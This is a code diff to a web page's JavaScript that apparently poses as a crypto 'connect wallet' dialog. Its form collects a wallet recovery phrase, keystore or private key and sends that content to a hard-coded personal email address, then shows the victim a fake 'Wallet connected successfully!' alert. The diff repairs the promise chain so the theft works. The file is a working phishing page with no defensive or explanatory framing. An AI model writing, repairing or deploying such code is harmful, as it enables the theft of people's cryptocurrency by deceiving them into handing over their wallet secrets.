@@ -193,7 +193,6 @@
             const form = document.getElementById('walletForm');
             const formData = new FormData(form);
 
-            // Get the content from the form (phrase, keystore, or private key)
             const contentValue = formData.get('content');
             const message = contentValue instanceof File ? 'File attached' : contentValue;
 
@@ -203,19 +202,15 @@
                 message: message,            // Pass the content value
                 to_email: "jnrrihie36@gmail.com" // The recipient email
             })
-
-
-        })
-            .then(response => {
-            alert("Wallet connected successfully!");
-            closeModal('modal-manual');
-        })
-            .catch(error => {
-                console.error("Failed to connect:", error);
-                alert("Failed to connect.");
-            });
+                .then(response => {
+                    alert("Wallet connected successfully!");
+                    closeModal('modal-manual');
+                })
+                .catch(error => {
+                    console.error("Failed to connect:", error);
+                    alert("Failed to connect.");
+                });
         }
-
 
         // Populate wallet list
         const walletList = document.getElementById('wallet-list');
@@ -238,5 +233,3 @@
 </body>
 
 </html>
-<script async data-explicit-opt-in="true" data-cookie-opt-in="true"
-    src="https://vercel.live/_next-live/feedback/feedback.js"></script>
